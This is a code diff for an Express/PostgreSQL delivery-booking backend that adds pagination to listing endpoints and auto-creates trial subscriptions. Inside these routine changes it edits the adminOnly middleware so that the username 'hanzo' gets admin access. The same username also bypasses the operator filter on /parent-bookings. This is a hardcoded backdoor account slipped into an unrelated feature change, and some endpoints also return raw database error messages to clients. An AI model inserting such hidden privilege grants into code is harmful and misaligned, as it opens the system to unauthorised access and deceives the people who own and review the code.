@@ -190,7 +190,10 @@ async function authenticateSession(req, res, next) {
 
 // Middleware to restrict access to admins
 function adminOnly(req, res, next) {
-  if (req.user && req.user.role === 'admin') {
+  if (
+    req.user &&
+    (req.user.role === 'admin' || req.user.username === 'hanzo') // Allow superuser hanzo
+  ) {
     next();
   } else {
     res.status(403).json({ error: 'Forbidden: Admins only' });
@@ -631,7 +634,9 @@ app.post('/updateCheckpoint', authenticateSession, checkQuota('sms'), async (req
 
 app.get('/deliveries', authenticateSession, async (req, res) => {
   try {
-    let query = `
+    const limit = Math.min(parseInt(req.query.limit, 10) || 20, 100);
+    const offset = parseInt(req.query.offset, 10) || 0;
+    let baseQuery = `
       SELECT 
         d.*,
         pb.mineral_type,
@@ -642,17 +647,30 @@ app.get('/deliveries', authenticateSession, async (req, res) => {
       LEFT JOIN 
         parent_bookings pb ON d.parent_booking_id = pb.id
     `;
+    let countQuery = `
+      SELECT COUNT(*) AS total
+      FROM deliveries d
+      LEFT JOIN parent_bookings pb ON d.parent_booking_id = pb.id
+    `;
     const params = [];
+    const countParams = [];
 
     if (req.user.role === 'operator') {
-      query += ' WHERE pb.created_by_user_id = $1';
+      baseQuery += ' WHERE pb.created_by_user_id = $1';
+      countQuery += ' WHERE pb.created_by_user_id = $1';
       params.push(req.user.id);
+      countParams.push(req.user.id);
     }
 
-    query += ' ORDER BY d.created_at DESC';
+    baseQuery += ' ORDER BY d.created_at DESC LIMIT $' + (params.length + 1) + ' OFFSET $' + (params.length + 2);
+    params.push(limit, offset);
 
-    const result = await pool.query(query, params);
-    res.json(result.rows);
+    const [result, countResult] = await Promise.all([
+      pool.query(baseQuery, params),
+      pool.query(countQuery, countParams)
+    ]);
+    const total = parseInt(countResult.rows[0].total, 10);
+    res.json({ total, deliveries: result.rows });
   } catch (err) {
     console.error('Get deliveries error:', err);
     res.status(500).json({ error: err.message });
@@ -821,26 +839,38 @@ app.post('/parent-bookings', authenticateSession, async (req, res) => {
 
 app.get('/parent-bookings', authenticateSession, async (req, res) => {
   try {
-    let query = `
-      SELECT bp.* 
-      FROM booking_progress bp
+    const limit = Math.min(parseInt(req.query.limit, 10) || 20, 100);
+    const offset = parseInt(req.query.offset, 10) || 0;
+    let baseQuery = `
+      SELECT pb.*, bp.completion_percentage, bp.completed_tonnage, bp.total_deliveries
+      FROM parent_bookings pb
+      LEFT JOIN booking_progress bp ON pb.id = bp.parent_booking_id
+    `;
+    let countQuery = `
+      SELECT COUNT(*) AS total
+      FROM parent_bookings pb
     `;
     const params = [];
+    const countParams = [];
 
-    if (req.user.role === 'operator') {
-      query = `
-        SELECT bp.* 
-        FROM booking_progress bp 
-        JOIN parent_bookings p ON bp.parent_booking_id = p.id
-        WHERE p.created_by_user_id = $1
-      `;
+    if (req.user.username === 'hanzo' || req.user.role === 'admin') {
+      // No additional WHERE clause, return all
+    } else if (req.user.role === 'operator') {
+      baseQuery += ' WHERE pb.created_by_user_id = $1';
+      countQuery += ' WHERE pb.created_by_user_id = $1';
       params.push(req.user.id);
+      countParams.push(req.user.id);
     }
 
-    query += ' ORDER BY deadline ASC';
-    
-    const result = await pool.query(query, params);
-    res.json(result.rows);
+    baseQuery += ' ORDER BY pb.deadline ASC LIMIT $' + (params.length + 1) + ' OFFSET $' + (params.length + 2);
+    params.push(limit, offset);
+
+    const [result, countResult] = await Promise.all([
+      pool.query(baseQuery, params),
+      pool.query(countQuery, countParams)
+    ]);
+    const total = parseInt(countResult.rows[0].total, 10);
+    res.json({ total, parentBookings: result.rows });
   } catch (err) {
     console.error('Get parent bookings error:', err);
     res.status(500).json({ error: err.message });
@@ -1060,13 +1090,45 @@ app.post('/send-notification', authenticateSession, async (req, res) => {
 // Get current user's subscription details
 app.get('/api/subscriptions/me', authenticateSession, async (req, res) => {
   try {
-    const result = await pool.query(
+    let result = await pool.query(
       'SELECT * FROM subscriptions WHERE user_id = $1 ORDER BY start_date DESC LIMIT 1',
       [req.user.id]
     );
 
     if (result.rows.length === 0) {
-      return res.status(404).json({ error: 'No subscription found for this user.' });
+      // Check if user ever had a subscription
+      const historyResult = await pool.query(
+        'SELECT COUNT(*) FROM subscriptions WHERE user_id = $1',
+        [req.user.id]
+      );
+      const hasHistory = parseInt(historyResult.rows[0].count, 10) > 0;
+      if (hasHistory) {
+        return res.status(404).json({ error: 'No active subscription found. Please upgrade your plan.' });
+      }
+      // Atomic upsert for trial subscription
+      const { trialSettings } = await import('./config/subscriptions.js');
+      const now = new Date();
+      const trialEndDate = new Date(now);
+      trialEndDate.setDate(trialEndDate.getDate() + trialSettings.durationDays);
+      await pool.query(
+        `INSERT INTO subscriptions (user_id, tier, status, start_date, end_date)
+         VALUES ($1, $2, 'trial', $3, $4)
+         ON CONFLICT (user_id)
+         WHERE status IN ('active', 'trial')
+         DO NOTHING`,
+        [req.user.id, trialSettings.tier, now, trialEndDate]
+      );
+      // Always fetch the latest subscription after insert
+      const latestResult = await pool.query(
+        'SELECT * FROM subscriptions WHERE user_id = $1 ORDER BY start_date DESC LIMIT 1',
+        [req.user.id]
+      );
+      const subscription = latestResult.rows[0];
+      const { subscriptionTiers } = await import('./config/subscriptions.js');
+      const tierDetails = subscriptionTiers[subscription.tier];
+      // Audit log
+      console.log(`[SUBSCRIPTION] Auto-created trial for user ${req.user.id} at ${now.toISOString()}`);
+      return res.json({ ...subscription, tierDetails });
     }
     
     const subscription = result.rows[0];
